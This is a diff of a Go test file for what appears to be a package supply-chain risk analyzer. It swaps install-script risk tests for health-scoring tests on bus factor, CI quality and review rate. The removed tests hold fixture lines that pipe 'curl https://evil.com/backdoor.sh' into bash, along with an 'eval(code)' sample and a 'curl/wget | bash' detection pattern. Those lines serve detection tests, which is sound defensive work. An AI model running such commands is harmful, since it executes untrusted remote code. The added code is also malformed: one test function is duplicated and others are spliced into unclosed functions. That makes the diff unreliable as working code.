@@ -8,6 +8,8 @@ import (
 	"github.com/metalstormbass/snyft/pkg/models"
 )
 
+// ===== Release Anomalies Tests (from main branch) =====
+
 func TestScoreReleaseAnomalies(t *testing.T) {
 	analyzer := NewAnalyzer()
 
@@ -393,7 +395,7 @@ func makeCommits(count int, startDate time.Time) []fetcher.GitHubCommit {
 			SHA: "abc123",
 			Commit: fetcher.GitHubCommitInfo{
 				Author: fetcher.GitHubCommitAuthor{
-					Name:  "Test Author",
+					Name:  "test-author",
 					Email: "test@example.com",
 					Date:  startDate.AddDate(0, 0, i*7), // Spread commits weekly
 				},
@@ -403,251 +405,225 @@ func makeCommits(count int, startDate time.Time) []fetcher.GitHubCommit {
 	return commits
 }
 
-func TestScoreInstallExecution_NoScripts(t *testing.T) {
-	analyzer := NewAnalyzer()
-	result := &models.AnalysisResult{
-		Metadata: models.PackageMetadata{
-			HasInstallScripts: false,
-			InstallScripts:    map[string]string{},
-		},
-	}
+// ===== Health Scoring Tests (new feature) =====
 
-	score := analyzer.scoreInstallExecution(result)
-
-	if score.RiskPoints != 0 {
-		t.Errorf("Expected 0 risk points for no scripts, got %d", score.RiskPoints)
-	}
-	if score.Score != 2 {
-		t.Errorf("Expected score of 2, got %d", score.Score)
-	}
-	if !score.Verified {
-		t.Error("Expected score to be verified")
-	}
-}
-
-func TestScoreInstallExecution_SingleBenignScript(t *testing.T) {
-	analyzer := NewAnalyzer()
-	result := &models.AnalysisResult{
-		Metadata: models.PackageMetadata{
-			HasInstallScripts: true,
-			InstallScripts: map[string]string{
-				"postinstall": "echo 'Installation complete'",
-			},
-			InstallScriptAnalysis: &models.InstallScriptAnalysis{
-				HasDangerousPatterns: false,
-				RiskLevel:            "LOW",
-				ScriptCount:          0,
-			},
-		},
-	}
-
-	score := analyzer.scoreInstallExecution(result)
-
-	if score.RiskPoints != 1 {
-		t.Errorf("Expected 1 risk point for single benign script, got %d", score.RiskPoints)
-	}
-	if score.Score != 0 {
-		t.Errorf("Expected score of 0, got %d", score.Score)
-	}
-}
-
-func TestScoreInstallExecution_MultipleBenignScripts(t *testing.T) {
-	analyzer := NewAnalyzer()
-	result := &models.AnalysisResult{
-		Metadata: models.PackageMetadata{
-			HasInstallScripts: true,
-			InstallScripts: map[string]string{
-				"preinstall":  "echo 'Pre-install'",
-				"postinstall": "echo 'Post-install'",
-			},
-			InstallScriptAnalysis: &models.InstallScriptAnalysis{
-				HasDangerousPatterns: false,
-				RiskLevel:            "LOW",
-				ScriptCount:          0,
-			},
-		},
-	}
-
-	score := analyzer.scoreInstallExecution(result)
-
-	if score.RiskPoints != 2 {
-		t.Errorf("Expected 2 risk points for multiple scripts, got %d", score.RiskPoints)
-	}
-	if score.Score != 0 {
-		t.Errorf("Expected score of 0, got %d", score.Score)
-	}
-}
-
-func TestScoreInstallExecution_DangerousScript(t *testing.T) {
-	analyzer := NewAnalyzer()
-	result := &models.AnalysisResult{
-		Metadata: models.PackageMetadata{
-			HasInstallScripts: true,
-			InstallScripts: map[string]string{
-				"postinstall": "curl https://evil.com/backdoor.sh | bash",
-			},
-			InstallScriptAnalysis: &models.InstallScriptAnalysis{
-				HasDangerousPatterns: true,
-				RiskLevel:            "HIGH",
-				ScriptCount:          1,
-				DangerousPatterns: []models.DangerousPattern{
-					{
-						Pattern:     "curl/wget | bash",
-						Description: "Downloads and executes remote script without verification",
-						Severity:    "HIGH",
-					},
-				},
-			},
-		},
-	}
-
-	score := analyzer.scoreInstallExecution(result)
-
-	if score.RiskPoints != 2 {
-		t.Errorf("Expected 2 risk points for dangerous script, got %d", score.RiskPoints)
-	}
-	if score.Score != 0 {
-		t.Errorf("Expected score of 0, got %d", score.Score)
-	}
-	if score.Description != "Dangerous install-time operations detected" {
-		t.Errorf("Unexpected description: %s", score.Description)
-	}
-}
-
-func TestScoreInstallExecution_PythonSetupWithCmdClass(t *testing.T) {
-	analyzer := NewAnalyzer()
-	result := &models.AnalysisResult{
-		Metadata: models.PackageMetadata{
-			HasInstallScripts: true,
-			InstallScripts: map[string]string{
-				"setup.py": "cmdclass={'install': CustomInstall}",
-			},
-			InstallScriptAnalysis: &models.InstallScriptAnalysis{
-				HasDangerousPatterns: true,
-				RiskLevel:            "MEDIUM",
-				ScriptCount:          1,
-				DangerousPatterns: []models.DangerousPattern{
-					{
-						Pattern:     "cmdclass override",
-						Description: "Overrides setup.py command classes",
-						Severity:    "MEDIUM",
-					},
-				},
-			},
-		},
-	}
-
-	score := analyzer.scoreInstallExecution(result)
-
-	if score.RiskPoints != 2 {
-		t.Errorf("Expected 2 risk points for dangerous Python setup, got %d", score.RiskPoints)
-	}
-}
-
-func TestScoreInstallExecution_JavaWithMavenExecPlugin(t *testing.T) {
-	analyzer := NewAnalyzer()
-	result := &models.AnalysisResult{
-		Metadata: models.PackageMetadata{
-			HasInstallScripts: true,
-			InstallScripts: map[string]string{
-				"pom.xml": "<plugin>maven-exec-plugin</plugin>",
-			},
-			InstallScriptAnalysis: &models.InstallScriptAnalysis{
-				HasDangerousPatterns: true,
-				RiskLevel:            "HIGH",
-				ScriptCount:          1,
-				DangerousPatterns: []models.DangerousPattern{
-					{
-						Pattern:     "maven-exec-plugin",
-						Description: "Executes arbitrary commands during build",
-						Severity:    "HIGH",
-					},
-				},
-			},
-		},
-	}
-
-	score := analyzer.scoreInstallExecution(result)
-
-	if score.RiskPoints != 2 {
-		t.Errorf("Expected 2 risk points for dangerous Maven plugin, got %d", score.RiskPoints)
-	}
-}
-
-func TestHasInstallTimeScripts_NPM(t *testing.T) {
+func TestScoreHealth_HighRisk(t *testing.T) {
 	tests := []struct {
 		name     string
-		scripts  map[string]string
-		expected bool
+		result   *models.AnalysisResult
+		wantRisk int // Expected risk points
 	}{
 		{
-			name: "has postinstall",
-			scripts: map[string]string{
-				"postinstall": "echo 'done'",
-				"test":        "jest",
+			name: "Single contributor, no CI, no reviews",
+			result: &models.AnalysisResult{
+				Metadata: models.PackageMetadata{
+					BusFactor:         1,
+					TopContributorPct: 95.0,
+					HasCI:             false,
+					CIQualityScore:    0,
+					CodeReviewRate:    0,
+				},
 			},
-			expected: true,
+			wantRisk: 2, // Highest risk
 		},
 		{
-			name: "has preinstall",
-			scripts: map[string]string{
-				"preinstall": "echo 'preparing'",
-				"build":      "webpack",
+			name: "High contributor concentration",
+			result: &models.AnalysisResult{
+				Metadata: models.PackageMetadata{
+					BusFactor:         1,
+					TopContributorPct: 100.0,
+					HasCI:             true,
+					CIQualityScore:    3, // Basic CI only
+					CodeReviewRate:    0,
+				},
 			},
-			expected: true,
+			wantRisk: 2, // High risk - concentrated development
 		},
 		{
-			name: "has install",
-			scripts: map[string]string{
-				"install": "node-gyp rebuild",
+			name: "No maintainers (fallback)",
+			result: &models.AnalysisResult{
+				Metadata: models.PackageMetadata{
+					BusFactor:      0, // Not calculated
+					Maintainers:    []string{},
+					HasCI:          false,
+					CIQualityScore: 0,
+					CodeReviewRate: 0,
+				},
 			},
-			expected: true,
-		},
-		{
-			name: "no install scripts",
-			scripts: map[string]string{
-				"test":  "jest",
-				"build": "webpack",
-				"start": "node index.js",
-			},
-			expected: false,
-		},
-		{
-			name: "empty install script",
-			scripts: map[string]string{
-				"postinstall": "",
-				"test":        "jest",
-			},
-			expected: false,
+			wantRisk: 2, // High risk
 		},
 	}
 
+	analyzer := NewAnalyzer()
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			result := hasInstallTimeScripts(tt.scripts)
-			if result != tt.expected {
-				t.Errorf("Expected %v, got %v for scripts: %v", tt.expected, result, tt.scripts)
+			score := analyzer.scoreHealth(tt.result)
+			if score.RiskPoints != tt.wantRisk {
+				t.Errorf("scoreHealth() RiskPoints = %d, want %d", score.RiskPoints, tt.wantRisk)
+			}
+			if !score.Verified && tt.result.Metadata.BusFactor > 0 {
+				t.Errorf("scoreHealth() should be verified when data is available")
 			}
 		})
 	}
 }
 
-func TestConvertToModelAnalysis(t *testing.T) {
-	scriptAnalysis := ScriptAnalysis{
-		HasDangerousPatterns: true,
-		RiskLevel:            "HIGH",
-		DangerousPatterns: []DangerousPattern{
-			{
-				Pattern:     "curl/wget | bash",
-				Description: "Downloads and executes remote script",
-				Severity:    "HIGH",
-				Match:       "curl https://evil.com | bash",
+func TestScoreHealth_MediumRisk(t *testing.T) {
+	tests := []struct {
+		name     string
+		result   *models.AnalysisResult
+		wantRisk int
+	}{
+		{
+			name: "Good bus factor with quality CI but no reviews",
+			result: &models.AnalysisResult{
+				Metadata: models.PackageMetadata{
+					BusFactor:         5,
+					TopContributorPct: 30.0,
+					HasCI:             true,
+					CIQualityScore:    7,
+					CIHasTests:        true,
+					CodeReviewRate:    50, // Below 75% threshold
+				},
 			},
-			{
-				Pattern:     "eval()",
-				Description: "Uses eval()",
-				Severity:    "HIGH",
-				Match:       "eval(code)",
+			wantRisk: 1, // Medium risk - 2 points (bus factor + CI)
+		},
+		{
+			name: "CI and reviews but high bus factor",
+			result: &models.AnalysisResult{
+				Metadata: models.PackageMetadata{
+					BusFactor:      1,
+					HasCI:          true,
+					CIQualityScore: 8,
+					CIHasTests:     true,
+					CodeReviewRate: 85,
+				},
+			},
+			wantRisk: 1, // Medium risk - 2 points (CI + reviews, but no bus factor point)
+		},
+		{
+			name: "Good bus factor with high review rate but basic CI",
+			result: &models.AnalysisResult{
+				Metadata: models.PackageMetadata{
+					BusFactor:      4,
+					HasCI:          true,
+					CIQualityScore: 4,
+					CodeReviewRate: 80,
+				},
+			},
+			wantRisk: 1, // Medium risk - 2 points (bus factor + reviews)
+		},
+	}
+
+	analyzer := NewAnalyzer()
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			score := analyzer.scoreHealth(tt.result)
+			if score.RiskPoints != tt.wantRisk {
+				t.Errorf("scoreHealth() RiskPoints = %d, want %d (evidence: %s)",
+					score.RiskPoints, tt.wantRisk, score.Evidence)
+			}
+		})
+	}
+}
+
+func TestScoreHealth_LowRisk(t *testing.T) {
+	tests := []struct {
+		name     string
+		result   *models.AnalysisResult
+		wantRisk int
+	}{
+		{
+			name: "Distributed development, CI with tests, required reviews",
+			result: &models.AnalysisResult{
+				Metadata: models.PackageMetadata{
+					BusFactor:           5,
+					TopContributorPct:   25.0,
+					HasCI:               true,
+					CIQualityScore:      9,
+					CIHasTests:          true,
+					HasBranchProtection: true,
+					RequiredReviewers:   2,
+					CodeReviewRate:      95.0,
+				},
+			},
+			wantRisk: 0, // Lowest risk
+		},
+		{
+			name: "Good bus factor, quality CI, high review rate",
+			result: &models.AnalysisResult{
+				Metadata: models.PackageMetadata{
+					BusFactor:         3,
+					TopContributorPct: 40.0,
+					HasCI:             true,
+					CIQualityScore:    8,
+					CIHasTests:        true,
+					CodeReviewRate:    80.0,
+				},
+			},
+			wantRisk: 0, // Low risk
+		},
+		{
+			name: "Many maintainers, CI, reviews",
+			result: &models.AnalysisResult{
+				Metadata: models.PackageMetadata{
+					BusFactor:           4,
+					Maintainers:         []string{"alice", "bob", "carol", "dave"},
+					HasCI:               true,
+					CIQualityScore:      7,
+					HasBranchProtection: true,
+					RequiredReviewers:   1,
+				},
+			},
+			wantRisk: 0, // Low risk
+		},
+	}
+
+	analyzer := NewAnalyzer()
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			score := analyzer.scoreHealth(tt.result)
+			if score.RiskPoints != tt.wantRisk {
+				t.Errorf("scoreHealth() RiskPoints = %d, want %d (evidence: %s)",
+					score.RiskPoints, tt.wantRisk, score.Evidence)
+			}
+			if score.RiskPoints == 0 && score.Score < 3 {
+				t.Errorf("scoreHealth() with 0 risk should have Score >= 3, got %d", score.Score)
+			}
+		})
+	}
+}
+
+func TestScoreHealth_EdgeCases(t *testing.T) {
+	tests := []struct {
+		name   string
+		result *models.AnalysisResult
+	}{
+		{
+			name: "Empty metadata",
+			result: &models.AnalysisResult{
+				Metadata: models.PackageMetadata{},
+			},
+		},
+		{
+			name: "Negative values (should handle gracefully)",
+			result: &models.AnalysisResult{
+				Metadata: models.PackageMetadata{
+					BusFactor:      -1, // Invalid but should not crash
+					CIQualityScore: -5,
+					CodeReviewRate: -10,
+				},
+			},
+		},
+		{
+			name: "Very high values",
+			result: &models.AnalysisResult{
+				Metadata: models.PackageMetadata{
+					BusFactor:         1000,
+					TopContributorPct: 150.0, // Invalid but should not crash
+					CIQualityScore:    100,
+					CodeReviewRate:    200.0,
+				},
 			},
 		},
 	}
@@ -812,6 +788,54 @@ func TestVerifySourceCode(t *testing.T) {
 					t.Errorf("Expected finding with severity=%s and category=%s, but not found in: %v",
 						tt.expectFindingSeverity, tt.expectFindingCategory, result.Findings)
 				}
+func TestScoreHealth_EdgeCases(t *testing.T) {
+	tests := []struct {
+		name   string
+		result *models.AnalysisResult
+	}{
+		{
+			name: "Empty metadata",
+			result: &models.AnalysisResult{
+				Metadata: models.PackageMetadata{},
+			},
+		},
+		{
+			name: "Negative values (should handle gracefully)",
+			result: &models.AnalysisResult{
+				Metadata: models.PackageMetadata{
+					BusFactor:      -1, // Invalid but should not crash
+					CIQualityScore: -5,
+					CodeReviewRate: -10,
+				},
+			},
+		},
+		{
+			name: "Very high values",
+			result: &models.AnalysisResult{
+				Metadata: models.PackageMetadata{
+					BusFactor:         1000,
+					TopContributorPct: 150.0, // Invalid but should not crash
+					CIQualityScore:    100,
+					CodeReviewRate:    200.0,
+				},
+			},
+		},
+	}
+
+	analyzer := NewAnalyzer()
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			// Should not panic
+			score := analyzer.scoreHealth(tt.result)
+
+			// Risk points should always be 0-2
+			if score.RiskPoints < 0 || score.RiskPoints > 2 {
+				t.Errorf("scoreHealth() RiskPoints out of range: %d", score.RiskPoints)
+			}
+
+			// Should have some description
+			if score.Description == "" {
+				t.Error("scoreHealth() Description should not be empty")
 			}
 		})
 	}
@@ -835,4 +859,213 @@ func TestSourceVerificationIntegrationInAnalyzer(t *testing.T) {
 			t.Error("Expected SourceVerification to be populated")
 		}
 	})
+func TestScoreHealth_BusFactorCalculation(t *testing.T) {
+	tests := []struct {
+		name              string
+		busFactor         int
+		topContributorPct float64
+		ciQualityScore    int
+		codeReviewRate    float64
+		wantHighRisk      bool
+	}{
+		{
+			name:              "Single contributor with 100% commits",
+			busFactor:         1,
+			topContributorPct: 100.0,
+			ciQualityScore:    5,
+			codeReviewRate:    0,
+			wantHighRisk:      true, // 0 points = 2 risk
+		},
+		{
+			name:              "Two contributors but good CI and reviews",
+			busFactor:         2,
+			topContributorPct: 55.0,
+			ciQualityScore:    8,
+			codeReviewRate:    80.0,
+			wantHighRisk:      false, // 2 points (CI + reviews) = 1 risk
+		},
+		{
+			name:              "Many contributors with good CI",
+			busFactor:         10,
+			topContributorPct: 15.0,
+			ciQualityScore:    8,
+			codeReviewRate:    0,
+			wantHighRisk:      false, // 2 points (bus factor + CI) = 1 risk
+		},
+		{
+			name:              "Three contributors (threshold) with reviews",
+			busFactor:         3,
+			topContributorPct: 40.0,
+			ciQualityScore:    0,
+			codeReviewRate:    85.0,
+			wantHighRisk:      false, // 2 points (bus factor + reviews) = 1 risk
+		},
+	}
+
+	analyzer := NewAnalyzer()
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := &models.AnalysisResult{
+				Metadata: models.PackageMetadata{
+					BusFactor:         tt.busFactor,
+					TopContributorPct: tt.topContributorPct,
+					HasCI:             tt.ciQualityScore > 0,
+					CIQualityScore:    tt.ciQualityScore,
+					CodeReviewRate:    tt.codeReviewRate,
+				},
+			}
+
+			score := analyzer.scoreHealth(result)
+
+			// High risk should correlate with low bus factor and missing practices
+			isHighRisk := score.RiskPoints >= 2
+			if isHighRisk != tt.wantHighRisk {
+				t.Errorf("scoreHealth() high risk = %v, want %v (bus factor: %d, evidence: %s)",
+					isHighRisk, tt.wantHighRisk, tt.busFactor, score.Evidence)
+			}
+		})
+	}
+}
+
+func TestScoreHealth_CodeReviewVerification(t *testing.T) {
+	tests := []struct {
+		name                string
+		hasBranchProtection bool
+		requiredReviewers   int
+		codeReviewRate      float64
+		ciQualityScore      int
+		expectsReviewPoint  bool
+	}{
+		{
+			name:                "Branch protection with required reviewers",
+			hasBranchProtection: true,
+			requiredReviewers:   2,
+			codeReviewRate:      0,
+			ciQualityScore:      8,
+			expectsReviewPoint:  true,
+		},
+		{
+			name:                "High review rate without protection",
+			hasBranchProtection: false,
+			requiredReviewers:   0,
+			codeReviewRate:      85.0,
+			ciQualityScore:      8,
+			expectsReviewPoint:  true,
+		},
+		{
+			name:                "Moderate review rate",
+			hasBranchProtection: false,
+			requiredReviewers:   0,
+			codeReviewRate:      60.0,
+			ciQualityScore:      8,
+			expectsReviewPoint:  false, // Below 75% threshold
+		},
+		{
+			name:                "No reviews",
+			hasBranchProtection: false,
+			requiredReviewers:   0,
+			codeReviewRate:      0,
+			ciQualityScore:      8,
+			expectsReviewPoint:  false,
+		},
+	}
+
+	analyzer := NewAnalyzer()
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := &models.AnalysisResult{
+				Metadata: models.PackageMetadata{
+					BusFactor:           3, // Good bus factor (gets 1 point)
+					HasCI:               true,
+					CIQualityScore:      tt.ciQualityScore, // >= 7 gets 1 point
+					HasBranchProtection: tt.hasBranchProtection,
+					RequiredReviewers:   tt.requiredReviewers,
+					CodeReviewRate:      tt.codeReviewRate,
+				},
+			}
+
+			score := analyzer.scoreHealth(result)
+
+			// With bus factor and good CI, score should be at least 2
+			// If reviews give a point, should be 3
+			minExpectedScore := 2
+			if tt.expectsReviewPoint {
+				minExpectedScore = 3
+			}
+
+			if score.Score < minExpectedScore {
+				t.Errorf("scoreHealth() Score = %d, want at least %d (evidence: %s)",
+					score.Score, minExpectedScore, score.Evidence)
+			}
+		})
+	}
+}
+
+func TestScoreHealth_CIQualityAssessment(t *testing.T) {
+	tests := []struct {
+		name           string
+		hasCI          bool
+		ciQualityScore int
+		ciHasTests     bool
+		expectsPoint   bool
+	}{
+		{
+			name:           "High quality CI with tests",
+			hasCI:          true,
+			ciQualityScore: 9,
+			ciHasTests:     true,
+			expectsPoint:   true,
+		},
+		{
+			name:           "Quality CI at threshold",
+			hasCI:          true,
+			ciQualityScore: 7,
+			ciHasTests:     true,
+			expectsPoint:   true,
+		},
+		{
+			name:           "Moderate quality CI",
+			hasCI:          true,
+			ciQualityScore: 5,
+			ciHasTests:     false,
+			expectsPoint:   false,
+		},
+		{
+			name:           "Basic CI only",
+			hasCI:          true,
+			ciQualityScore: 3,
+			ciHasTests:     false,
+			expectsPoint:   false,
+		},
+		{
+			name:           "No CI",
+			hasCI:          false,
+			ciQualityScore: 0,
+			ciHasTests:     false,
+			expectsPoint:   false,
+		},
+	}
+
+	analyzer := NewAnalyzer()
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			result := &models.AnalysisResult{
+				Metadata: models.PackageMetadata{
+					BusFactor:      3, // Good bus factor
+					HasCI:          tt.hasCI,
+					CIQualityScore: tt.ciQualityScore,
+					CIHasTests:     tt.ciHasTests,
+				},
+			}
+
+			score := analyzer.scoreHealth(result)
+
+			// Score should be at least 1 (bus factor)
+			// If CI quality gives a point, should be 2+
+			if tt.expectsPoint && score.Score < 2 {
+				t.Errorf("scoreHealth() expected CI quality point but Score = %d (evidence: %s)",
+					score.Score, score.Evidence)
+			}
+		})
+	}
 }
